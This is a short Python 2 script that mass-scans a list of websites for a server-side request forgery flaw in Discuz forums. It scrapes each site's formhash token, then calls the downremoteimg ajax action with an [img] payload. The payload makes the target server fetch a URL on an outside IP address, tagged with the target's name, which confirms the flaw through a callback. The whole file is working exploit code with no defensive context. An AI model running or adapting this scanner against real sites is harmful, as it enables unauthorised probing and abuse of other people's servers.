#!/usr/bin/env python
# encoding: utf-8

import os
import sys
import urlparse
import requests
import re


def check_ssrf():

    for website in open('ssrf_discuz.txt'):

        request = requests.session()
        website = website.strip()
        formurl = 'http://{website}/forum.php'.format(website=website)
        try:
            # print formurl
            response = request.get(formurl)
            formhash = re.findall(r'formhash" value="(.*?)"', response.content)
            if formhash:
                print 'formhash: ', formhash
                payload = 'http://45.32.250.207/404.php?s={website}.jpg'.format(website=website)

                url = 'http://{website}/forum.php?mod=ajax&action=downremoteimg&formhash={formhash}&message=[img]{payload}[/img]'.format(
                               website=website,
                               formhash=formhash,
                               payload=payload)
                response = request.get(url, timeout=5, verify=False)
                print url, len(response.content)
        except Exception, e:
            print website, e



def main():

    check_ssrf()


if __name__ == '__main__':
    os.system('clear')

    main()
